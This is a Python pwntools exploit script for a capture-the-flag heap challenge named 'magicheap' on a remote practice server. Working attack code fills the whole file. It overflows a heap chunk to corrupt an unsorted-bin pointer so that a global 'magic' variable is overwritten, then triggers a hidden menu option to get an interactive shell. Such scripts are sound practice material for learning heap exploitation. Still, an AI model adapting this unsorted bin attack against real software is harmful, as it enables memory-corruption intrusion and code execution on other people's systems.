from pwn import *

context.log_level = "debug"

exe = ELF("./magicheap")
# r = exe.process()
r = remote("node4.buuoj.cn", 26032)


def recvmenu():
    r.recvuntil(b"Your choice :")


def create(size: int, content: bytes):
    recvmenu()
    r.send(b"1")
    r.recvuntil(b"Size of Heap : ")
    r.send(str(size).encode())
    r.recvuntil(b"Content of heap:")
    r.send(content)


def edit(index: int, content: bytes):
    recvmenu()
    r.send(b"2")
    r.recvuntil(b"Index :")
    r.send(str(index).encode())
    r.recvuntil(b"Size of Heap : ")
    r.send(str(len(content)).encode())
    r.recvuntil(b"Content of heap : ")
    r.send(content)


def delete(index: int):
    recvmenu()
    r.send(b"3")
    r.recvuntil(b"Index :")
    r.send(str(index).encode())


def l33t():
    recvmenu()
    r.send(b"4869")


magic_chunk = exe.sym["magic"] - 0x10
create(0x10, b"aaa")
create(0x80, b"bbb")
create(0x20, b"ccc")
delete(1)
edit(0, p64(0) * 3 + p64(0x91) + p64(0) + p64(magic_chunk))
create(0x80, b"dddd")
l33t()
# unsorted bin attack, libc version <2.29
r.interactive()
